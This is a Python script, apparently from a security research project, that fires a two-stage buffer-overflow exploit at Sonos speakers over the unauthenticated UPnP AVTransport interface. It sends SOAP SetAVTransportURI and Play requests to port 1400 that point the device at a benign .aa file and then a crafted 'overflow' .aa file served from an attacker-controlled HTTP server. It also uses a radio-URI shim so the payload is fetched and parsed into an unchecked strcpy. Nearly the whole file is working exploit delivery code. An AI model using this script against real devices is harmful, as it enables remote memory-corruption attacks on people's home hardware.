#!/usr/bin/env python3
"""Fire an .aa at a Sonos unit over the pre-auth AVTransport surface.

Two stage, as proven on 57.23 (docs/RE_AUDIBLE.md): a benign .aa first so the
transport binds (r22 = [stream+6088] becomes non-zero), then the overflow .aa
whose parse reaches the unchecked strcpy. Both stages are one
SetAVTransportURI plus a Play.

Usage:
  python3 scripts/fire_aa.py --ip 192.168.4.84 \
      --stage1 http://192.168.4.46:8899/benign.aa \
      --stage2 http://192.168.4.46:8899/payload.aa --wait 3

Serve the directory separately, e.g.
  python3 -m http.server 8899 --bind 0.0.0.0 --directory captures/aa
"""

import argparse
import time
import urllib.request

BODY = """<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body><u:SetAVTransportURI xmlns:u="urn:schemas-upnp-org:service:AVTransport:1">
<InstanceID>0</InstanceID><CurrentURI>{uri}</CurrentURI>
<CurrentURIMetaData>&lt;DIDL-Lite xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:upnp="urn:schemas-upnp-org:metadata-1-0/upnp/" xmlns="urn:schemas-upnp-org:metadata-1-0/DIDL-Lite/"&gt;&lt;item id="" parentID="" restricted="1"&gt;&lt;res protocolInfo="http-get:*:audio/aac:*"&gt;{uri}&lt;/res&gt;&lt;/item&gt;&lt;/DIDL-Lite&gt;</CurrentURIMetaData>
</u:SetAVTransportURI></s:Body></s:Envelope>"""

PLAY = """<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body><u:Play xmlns:u="urn:schemas-upnp-org:service:AVTransport:1">
<InstanceID>0</InstanceID><Speed>1</Speed></u:Play></s:Body></s:Envelope>"""


def soap(ip, action, body, timeout):
    req = urllib.request.Request(
        "http://%s:1400/MediaRenderer/AVTransport/Control" % ip,
        data=body.encode(),
        headers={
            "Content-Type": 'text/xml; charset="utf-8"',
            "SOAPACTION": '"urn:schemas-upnp-org:service:AVTransport:1#%s"' % action,
        },
    )
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.status


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--ip", required=True)
    ap.add_argument("--stage1", help="benign .aa URL (transport bind)")
    ap.add_argument("--stage2", required=True, help="overflow .aa URL")
    ap.add_argument("--wait", type=float, default=3.0, help="seconds between stages")
    ap.add_argument("--no-shim", action="store_true", help="send the http:// URI as-is")
    ap.add_argument("--no-play", action="store_true")
    ap.add_argument("--timeout", type=float, default=20.0)
    args = ap.parse_args()

    for name, uri in (("stage1", args.stage1), ("stage2", args.stage2)):
        if not uri:
            continue
        # the daemon plays http media through the radio shim; bare http:// is
        # accepted by SetAVTransportURI but never fetched by the transport
        if uri.startswith("http://") and not args.no_shim:
            uri = "x-rincon-mp3radio://" + uri
        print("%s SETAV %s -> %s" % (name, uri, soap(args.ip, "SetAVTransportURI", BODY.format(uri=uri), args.timeout)))
        if not args.no_play:
            try:
                print("%s PLAY  -> %s" % (name, soap(args.ip, "Play", PLAY, args.timeout)))
            except Exception as exc:  # announcements auto-play; a PLAY can 500 harmlessly
                print("%s PLAY  -> %s" % (name, exc))
        if name == "stage1" and args.stage1:
            time.sleep(args.wait)


if __name__ == "__main__":
    main()
